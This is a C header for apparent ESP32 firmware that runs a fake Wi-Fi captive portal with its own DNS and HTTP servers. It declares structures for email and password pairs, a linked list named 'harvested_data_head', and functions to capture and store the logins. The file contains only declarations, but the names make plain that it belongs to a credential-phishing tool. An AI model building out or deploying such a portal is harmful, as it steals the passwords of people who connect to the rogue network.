#pragma once

// esp32 device libraries
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_netif.h"
#include "nvs_flash.h"

// DNS server includes (freeRTOS for multi-threading)
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "dns_server.h"

// HTTP server libraries
#include "esp_http_server.h"

// struct to store post request data
typedef struct {
    char email[128];
    char password[128];
    bool valid;
} login_data_t;

// node def 
typedef struct ListNode {
    login_data_t data;
    struct ListNode *next;
} ListNode;

// global head of the list
extern ListNode *harvested_data_head;

// expose main function
void captive_portal_main(void);
void stop_captive_portal(void);
login_data_t get_captured_login(void);
void add_login_to_list(login_data_t new_data);

